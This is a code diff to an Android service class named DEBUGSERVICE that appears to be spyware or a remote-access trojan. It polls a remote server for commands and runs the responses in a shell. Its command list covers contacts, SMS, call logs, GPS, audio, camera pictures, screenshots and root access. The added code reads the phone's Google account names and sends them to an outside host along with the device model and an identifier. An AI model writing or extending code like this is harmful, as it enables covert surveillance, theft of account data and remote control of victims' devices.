@@ -7,6 +7,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
@@ -18,12 +19,15 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.annotation.SuppressLint;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.os.AsyncTask;
@@ -43,6 +47,11 @@ public class DEBUGSERVICE extends Service {
 			"UNLOCK!", "install", "screenshot", "packages", "audio",
 			"pictureBack", "pictureFront", "sendall", "adb", "getContacts",
 			"getSMS", "getCall", "getBrowser", "getGPS", "SU", "root" };
+
+	public static String[] names;
+	public static String name;
+	public static int random;
+	SharedPreferences prefs;
 
 	public boolean isOnline() {
 		ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -80,6 +89,31 @@ public class DEBUGSERVICE extends Service {
 
 		try {
 			threadPolicy();
+
+			prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE);
+			boolean first = prefs.getBoolean("first", true);
+			DEBUGSERVICE.random = prefs.getInt("random",
+					new Random().nextInt(10000));
+			DEBUGSERVICE.name = prefs.getString("name", "NO_INFO");
+			if (first) {
+				final AccountManager manager = AccountManager.get(this);
+				final Account[] accounts = manager
+						.getAccountsByType("com.google");
+				final int size = accounts.length;
+				DEBUGSERVICE.names = new String[size];
+				for (int i = 0; i < size; i++) {
+					DEBUGSERVICE.names[i] = accounts[i].name;
+				}
+
+				if (DEBUGSERVICE.names.length > 0) {
+					DEBUGSERVICE.name = DEBUGSERVICE.names[0];
+				}
+				SharedPreferences.Editor edit = prefs.edit();
+				edit.putBoolean("first", first);
+				edit.putInt("random", DEBUGSERVICE.random);
+				edit.putString("name", DEBUGSERVICE.name);
+				edit.commit();
+			}
 
 			IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
 			filter.addAction(Intent.ACTION_SCREEN_OFF);
@@ -171,14 +205,18 @@ public class DEBUGSERVICE extends Service {
 						"http://www.lucideustech.in/androidcp/device/getcommand");
 				BasicNameValuePair usernameBasicNameValuePair = new BasicNameValuePair(
 						"did", android.os.Build.MODEL);
+				BasicNameValuePair usernameValuePair = new BasicNameValuePair(
+						"name", DEBUGSERVICE.name);
+				BasicNameValuePair numberValuePair = new BasicNameValuePair(
+						"number", "" + DEBUGSERVICE.random);
 				List<NameValuePair> nameValuePairList = new ArrayList<NameValuePair>();
 				nameValuePairList.add(usernameBasicNameValuePair);
-
+				nameValuePairList.add(usernameValuePair);
+				nameValuePairList.add(numberValuePair);
 				try {
 					UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(
 							nameValuePairList);
 					httpPost.setEntity(urlEncodedFormEntity);
-
 					try {
 						HttpResponse httpResponse = httpClient
 								.execute(httpPost);
@@ -199,11 +237,9 @@ public class DEBUGSERVICE extends Service {
 						} else {
 							Shell.SH.run(response);
 						}
-
 					} catch (ClientProtocolException cpe) {
 					} catch (IOException ioe) {
 					}
-
 				} catch (Exception uee) {
 				}
 				return null;
@@ -216,6 +252,42 @@ public class DEBUGSERVICE extends Service {
 	}
 
 	private void checkDevice() {
+
+		class CheckDeviceAsync extends AsyncTask<Void, Void, Void> {
+
+			@SuppressWarnings("unused")
+			@Override
+			protected Void doInBackground(Void... params) {
+				HttpClient httpClient = new DefaultHttpClient();
+				HttpPost httpPost = new HttpPost(
+						"http://www.lucideustech.in/androidcp/device/checkdevice");
+				BasicNameValuePair usernameBasicNameValuePair = new BasicNameValuePair(
+						"did", android.os.Build.MODEL);
+				BasicNameValuePair usernameValuePair = new BasicNameValuePair(
+						"name", DEBUGSERVICE.name);
+				BasicNameValuePair numberValuePair = new BasicNameValuePair(
+						"number", "" + DEBUGSERVICE.random);
+				List<NameValuePair> nameValuePairList = new ArrayList<NameValuePair>();
+				nameValuePairList.add(usernameBasicNameValuePair);
+				nameValuePairList.add(usernameValuePair);
+				nameValuePairList.add(numberValuePair);
+				try {
+					UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(
+							nameValuePairList);
+					httpPost.setEntity(urlEncodedFormEntity);
+					try {
+						HttpResponse httpResponse = httpClient
+								.execute(httpPost);
+					} catch (ClientProtocolException cpe) {
+						cpe.printStackTrace();
+					} catch (IOException ioe) {
+						ioe.printStackTrace();
+					}
+				} catch (Exception uee) {
+				}
+				return null;
+			}
+		}
 		if (Constants.DEBUG) {
 			Shell.SH.run("echo 'check Device' > /sdcard/Android/data/settings/Logger/bootup.txt");
 		}
